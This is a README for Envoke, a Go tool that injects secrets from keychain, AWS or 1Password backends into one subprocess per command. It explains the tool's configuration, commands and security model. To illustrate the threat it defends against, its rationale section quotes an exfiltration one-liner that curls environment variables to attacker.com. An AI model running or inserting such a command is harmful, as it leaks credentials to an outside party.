# Envoke (`ee`)

Inject secrets per-command from pluggable backends. Nothing persists. Nothing leaks.

```
$ ee -- make dev
$ ee -- psql -h $DB_HOST -U $DB_USER
$ ee -- aider --model claude-sonnet-4-6
```

Envoke reads a project dotfile (`.envoke`), fetches the required secrets from one or more configured backends, and spawns your command as a subprocess with those secrets in its environment. The subprocess exits; the secrets vanish.

---

## Why

`.env` files get committed. `.env.example` goes stale. Every developer has a different setup. Secrets loaded globally into the shell environment are readable by every process — including every `postinstall` script in your `node_modules`.

Envoke addresses this by making secret injection **per-command, not ambient**. A malicious `postinstall` script that runs `curl attacker.com -d "$(env)"` gets nothing useful, because the secrets were never in the environment to begin with.

The `.envoke` dotfile is committed to git. It contains no secrets — only the *shape* of the environment: which namespaces are needed and which backend holds them. New developers clone the repo, run `ee -- make dev`, and it works. The secret surface is auditable in pull requests.

---

## Installation

### Download a release

Pre-built binaries for macOS, Linux, and Windows are available on the [releases page](https://git.dries.info/gerco/Envoke/releases).

### Build from source

```bash
# All backends (~35MB)
go build -tags "keychain,aws,1password" -o ee ./cmd/ee

# Minimal build, no backends (~7.6MB)
go build -o ee ./cmd/ee

# Specific backends
go build -tags "keychain,aws" -o ee ./cmd/ee
```

See [Building](#building) for details on build tags.

---

## Quick Start

**1. Configure a backend** in `~/.config/envoke/config.toml`:

```toml
# The "local" keychain backend is built-in; no config needed.

[[backend]]
name = "aws-dev"
type = "aws"
[backend.options]
region = "us-east-1"
prefix = "myteam/"
```

**2. Store a secret:**

```bash
ee set db-local DB_PASSWORD          # prompts for value (hidden)
ee set db-local DB_HOST              # prompts for value
```

**3. Run a command with secrets injected:**

```bash
ee -- psql -h $DB_HOST -U myuser
```

Envoke walks up from the current directory looking for `.envoke`. The first `.envoke` it finds determines the project root.

---

## Configuration

Configuration is split across three layers, merged in order:

```
~/.config/envoke/config.toml    ← your backends, your credentials  (never committed)
<project>/.envoke               ← what this project needs           (committed to git)
<project>/.envoke.local         ← your personal overrides           (gitignored)
```

On Windows the global config lives at `%APPDATA%\envoke\config.toml`. On Linux/macOS, `$XDG_CONFIG_HOME/envoke/config.toml` is used, defaulting to `~/.config/envoke/config.toml`.

### Global config (`~/.config/envoke/config.toml`)

Describes how to reach each backend. This file is never committed.

```toml
[[backend]]
name = "local"
type = "keychain"

[[backend]]
name = "aws-dev"
type = "aws"
[backend.options]
region = "us-east-1"
prefix = "myteam-dev/"

[[backend]]
name = "aws-prod"
type = "aws"
[backend.options]
region = "us-east-1"
prefix = "myteam-prod/"

[[backend]]
name = "op-service"
type = "1password"
[backend.options]
token = "ops_..."
```

Each `[[backend]]` entry has:

| Field | Description |
|-------|-------------|
| `name` | Identifier referenced in `.envoke` |
| `type` | Backend type: `keychain`, `aws`, `1password` |
| `[backend.options]` | Backend-specific key/value options (see [Backends](#backends)) |

A `keychain` backend named `"local"` is always available without any configuration.

### Project dotfile (`.envoke`)

Committed to git. Describes which namespaces this project needs and which backend holds them.

```toml
[[namespace]]
name = "db-dev"
backend = "aws-dev"

[[namespace]]
name = "local-creds"
backend = "local"

[[namespace]]
name = "stripe"
backend = "aws-dev"
```

Each `[[namespace]]` entry has:

| Field | Description |
|-------|-------------|
| `name` | Namespace identifier, also the secret group name in the backend |
| `backend` | Must match a `name` in the global config |
| `[namespace.options]` | Optional: override backend options for this namespace only |

### Local overrides (`.envoke.local`)

Same format as `.envoke`. Namespaces with the same name replace those from `.envoke`; new namespaces are appended. Add `.envoke.local` to `.gitignore`.

```toml
# Override the db-dev namespace to use a local keychain instead of AWS
[[namespace]]
name = "db-dev"
backend = "local"
```

---

## Backends

### Keychain (OS native)

**Build tag:** `keychain`  
**Platforms:** macOS (Keychain), Windows (Credential Manager), Linux (Secret Service / GNOME Keyring / KWallet)

Uses the OS credential store. No extra config required. The `"local"` backend is a pre-configured keychain instance that is always available.

```toml
[[backend]]
name = "local"
type = "keychain"
```

No backend options.

### AWS Secrets Manager

**Build tag:** `aws`

Stores all keys in a namespace as a single JSON object in one AWS secret. This minimises API calls and cost.

```toml
[[backend]]
name = "aws-dev"
type = "aws"
[backend.options]
region = "us-east-1"
prefix = "myteam/"
```

| Option | Description |
|--------|-------------|
| `region` | AWS region. Overrides the region from your AWS credentials/environment. |
| `prefix` | Prepended to the namespace name to form the secret name. For example, `prefix = "myteam/"` and namespace `"db-dev"` → secret name `"myteam/db-dev"`. |

AWS credentials are resolved using the standard AWS SDK credential chain: environment variables, `~/.aws/credentials`, IAM instance profiles, etc.

### 1Password Secrets Manager

**Build tag:** `1password`

Uses a 1Password service account token. The service account must have read access to the relevant vaults. Write operations are not supported (service accounts are read-only).

```toml
[[backend]]
name = "op-service"
type = "1password"
[backend.options]
token = "ops_..."
```

| Option | Description |
|--------|-------------|
| `token` | Service account token. Can also be set via the `OP_SERVICE_ACCOUNT_TOKEN` environment variable. |

**Key format:** Keys in a 1Password namespace map to items as `item` or `item/field`. The default field is `password`.

```bash
# Fetches the "password" field of the item named "myapp" in the vault
ee -- myapp

# Fetches a specific field
ee -- myapp/api_key
```

Storage model: namespace = vault name, key = item name (optionally with `/field`).

---

## Commands

### `ee -- <command> [args...]`

Run a command with all secrets from `.envoke` injected into its environment.

```bash
ee -- make dev
ee -- npm start
ee -- psql -h $DB_HOST -U $DB_USER mydb
ee -- aider --model claude-sonnet-4-6
```

The current environment is preserved as a base layer. Secrets are layered on top, overriding any matching variable names. The exit code of the subprocess is passed through.

### `ee set <namespace> <key> [value]`

Store a secret in a backend namespace.

```bash
ee set db-dev DB_PASSWORD           # prompts for value (echo hidden)
ee set db-dev DB_HOST               # prompts for value

echo "s3cr3t" | ee set db-dev DB_PASSWORD   # read from stdin
ee set db-dev DB_PASSWORD mypassword        # value as argument (appears in shell history — avoid)

ee set --backend aws-dev db-dev DB_PASSWORD   # use a specific backend
```

If the namespace is not yet in `.envoke`, it is added automatically.

**Flags:**

| Flag | Description |
|------|-------------|
| `--backend <name>` | Use a specific backend, bypassing namespace lookup |

### `ee list [namespace]`

List secret keys. Values are never shown.

```bash
ee list                 # all keys from all namespaces
ee list db-dev          # keys from one namespace
```

### `ee status`

Show the health of each namespace backend for the current project.

```
NAMESPACE      BACKEND     STATUS
────────────────────────────────────
aws-dev        aws         ✓ ok
db-local       keychain    ✓ ok
stripe-test    1password   ✗ token expired
```

---

## Building

Backends use Go build tags for optional compilation. Only include the backends you need.

| Tag | Backend | Notes |
|-----|---------|-------|
| `keychain` | OS keychain | macOS/Windows/Linux |
| `aws` | AWS Secrets Manager | ~5MB overhead |
| `1password` | 1Password Secrets Manager | ~19MB overhead |
| `keeper` | Keeper Secrets Manager | Stub — not yet implemented |
| `jumpcloud` | JumpCloud Password Manager | Stub — not yet implemented |

```bash
# All implemented backends
go build -tags "keychain,aws,1password" -o ee ./cmd/ee

# Minimal — no backends (useful if you only use the built-in keychain default)
go build -o ee ./cmd/ee

# Using justfile
just build              # all backends
just build-minimal      # no backends
just build-with keychain,aws
```

---

## Security Model

Secrets exist only in the environment of the subprocess spawned by `ee`. They are not written to disk, not exported into the parent shell, and not visible to other processes.

**Supply chain:** A malicious `postinstall` script that exfiltrates `$(env)` captures nothing, because secrets were never in the ambient environment.

**Agent isolation:** AI coding agents (`aider`, `claude`, etc.) can be invoked via `ee`. They read secrets from `$ENV_VAR` like any other program, but never authenticate directly to Keeper, AWS, or 1Password. The blast radius of a compromised agent is limited to the process lifetime.

**Backend authentication:** Each backend inherits whatever authentication the backend enforces — Touch ID, Face ID, MFA, hardware tokens. Envoke does not weaken this.
